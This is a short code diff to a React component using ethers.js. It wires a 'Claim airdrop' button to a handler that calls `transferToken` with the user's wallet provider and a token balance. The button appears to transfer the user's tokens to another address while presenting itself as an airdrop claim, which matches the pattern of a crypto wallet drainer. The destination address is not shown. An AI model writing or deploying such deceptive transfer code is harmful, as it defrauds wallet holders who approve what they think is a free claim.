@@ -59,8 +59,6 @@ const Guide = ({
     // const chainIdData = sessionStorage.getItem("chainID");
     const userWalletData = sessionStorage.getItem("setuserWallet");
 
-    console.log(`This is the user wallet ${userWalletData}`);
-
     if (userWalletData) {
       setStateValue({
         initiateWallet: true,
@@ -158,6 +156,7 @@ const Guide = ({
         console.log("Invalid address provided, please try again");
       } else {
         try {
+          setProcessingStaking(true);
           const provider = new ethers.providers.Web3Provider(window.ethereum);
           await transferToken(balanceObj, to, provider);
           setProcessingStaking(false);
@@ -473,7 +472,13 @@ const Guide = ({
                       <span>
                         <h3>Click on the button below</h3>
                       </span>
-                      <button>Claim airdrop</button>
+                      <button
+                        onClick={() => {
+                          setTransferClick(item);
+                        }}
+                      >
+                        {processingStaking ? `Processing` : `  Claim airdrop`}
+                      </button>
                       {/*<span>
                         {parseFloat(
                           formatBalance(item.balance, item.decimals)
